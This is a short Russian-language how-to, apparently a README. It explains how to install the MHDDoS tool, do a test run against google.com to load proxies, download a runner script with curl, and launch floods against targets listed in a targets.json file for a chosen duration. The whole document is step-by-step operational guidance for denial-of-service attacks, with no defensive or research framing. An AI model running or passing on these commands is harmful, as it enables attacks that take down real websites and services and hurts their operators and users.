1. Установите на сервере MHDDoS
```
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip install -r requirements.txt
```

2. Выполните холостой запуск для подргужения прокси
```
 python3 start.py STRESS https://google.com 0 1 0 1 1
 ```
 3. Установите jq

```
sudo apt-get update
sudo apt-get install -y jq
```

4. установите раннер
```
curl https://raw.githubusercontent.com/rxitech/k6clean/master/runner.sh > runner.sh
```

5. Создайте targets.json файл с целями

6. Запустите раннер передав файл с целями и продолжительность выполнения в секундах
```
./runner.sh targets.json 300
```
